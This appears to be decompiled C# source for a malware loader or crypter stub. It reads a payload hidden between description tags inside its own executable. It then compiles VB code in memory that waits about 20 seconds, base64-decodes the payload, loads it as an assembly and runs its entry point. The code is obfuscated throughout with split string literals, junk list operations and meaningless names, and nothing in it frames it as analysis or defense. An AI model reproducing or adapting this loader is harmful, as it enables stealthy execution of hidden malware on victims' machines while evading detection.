using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace fede;

[StandardModule]
internal sealed class duffyduff
{
	public class crappycrap
	{
		[DebuggerNonUserCode]
		public crappycrap()
		{
		}

		public static object doaaaww()
		{
			doaaww();
			object result = default(object);
			return result;
		}

		public static object doaaww()
		{
			aeeux.doaaw();
			object result = default(object);
			return result;
		}
	}

	public class aeeux
	{
		[DebuggerNonUserCode]
		public aeeux()
		{
		}

		public static object doaaw()
		{
			jjo();
			object result = default(object);
			return result;
		}
	}

	public static object jjo()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		ArrayList arrayList = new ArrayList();
		arrayList.Add(10);
		arrayList.Add(10);
		arrayList.Add(10);
		CompilerParameters val = new CompilerParameters();
		new ArrayList();
		Thread.Sleep(10);
		CodeDomProvider val2 = CodeDomProvider.CreateProvider("+B".Replace("+", "V"));
		arrayList.Add(10);
		val.set_GenerateInMemory(true);
		arrayList.Add(10);
		val.set_CompilerOptions("/optimize+ /platform:x86 /target:library");
		arrayList.Add(10);
		val.get_ReferencedAssemblies().AddRange(new string[6] { "System.dll", "System.Data.dll", "System.Deployment.dll", "System.Drawing.dll", "System.Windows.Forms.dll", "System.Xml.dll" });
		arrayList.Add(10);
		StringBuilder stringBuilder = new StringBuilder();
		arrayList.Add(10);
		arrayList.Add(10);
		stringBuilder.Append("\r\nImports System, Microsoft.VisualBasic, System.Reflection, System.Diagnostics");
		stringBuilder.Append("\r\nModule Yo");
		arrayList.Add(10);
		stringBuilder.Append("\r\nSub Main()");
		arrayList.Add(10);
		stringBuilder.Append("\r\n        Dim t As New Stopwatch");
		stringBuilder.Append("\r\n");
		stringBuilder.Append("\r\n        Do Until t.ElapsedMilliseconds >= 20000");
		stringBuilder.Append("\r\n           t.Start()");
		stringBuilder.Append("\r\n           System.Threading.Thread.Sleep(1)");
		stringBuilder.Append("\r\n          ");
		stringBuilder.Append("\r\n        Loop");
		stringBuilder.Append("\r\n        t.Stop()");
		stringBuilder.Append("\r\nEnd Sub");
		stringBuilder.Append("\r\nPublic function hard(byval s as Object) As Byte");
		stringBuilder.Append("\r\nreturn Assembly.Load(convert.frombase64string(s)).Entrypoint.Invoke(nothing,nothing)");
		stringBuilder.Append("\r\nend function");
		stringBuilder.Append("\r\nEnd module");
		CompilerResults val3 = val2.CompileAssemblyFromSource(val, new string[1] { stringBuilder.ToString() });
		arrayList.Add(10);
		Type type = val3.get_CompiledAssembly().GetType("°°o".Replace("°°", "Y"));
		arrayList.Add(10);
		arrayList.Add(10);
		return type.GetMethod("#rd".Replace("#", "ha"));
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		ArrayList arrayList = new ArrayList();
		arrayList.Add(10);
		arrayList.Add(10);
		string text = "";
		arrayList.Add(10);
		string text2 = "<descri-".Replace("-", "ption>");
		arrayList.Add(10);
		string value = "</descr-".Replace("-", "iption>");
		arrayList.Add(10);
		FileSystem.FileOpen(1, Process.GetCurrentProcess().MainModule!.FileName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		arrayList.Add(10);
		checked
		{
			string text3 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text3, -1L, false);
			arrayList.Add(40);
			FileSystem.FileClose(new int[1] { 1 });
			string text4 = text3;
			arrayList.Add(40);
			int num = text4.IndexOf(text2) + text2.Length;
			arrayList.Add(40);
			while (num != text2.Length - 1)
			{
				arrayList.Add(10);
				text = text4.Substring(num, text4.IndexOf(value, num) - num);
				arrayList.Add(40);
				num = text4.IndexOf(text2, num) + text2.Length;
				arrayList.Add(10);
			}
			arrayList.Add(10);
			object obj = new string[1] { text };
			object obj2 = jjo();
			object[] array = new object[2]
			{
				RuntimeHelpers.GetObjectValue(jjo()),
				RuntimeHelpers.GetObjectValue(obj)
			};
			bool[] array2 = new bool[2] { false, true };
			NewLateBinding.LateCall(obj2, (Type)null, "Invoke", array, (string[])null, (Type[])null, array2, true);
			if (array2[1])
			{
				obj = RuntimeHelpers.GetObjectValue(array[1]);
			}
		}
	}
}
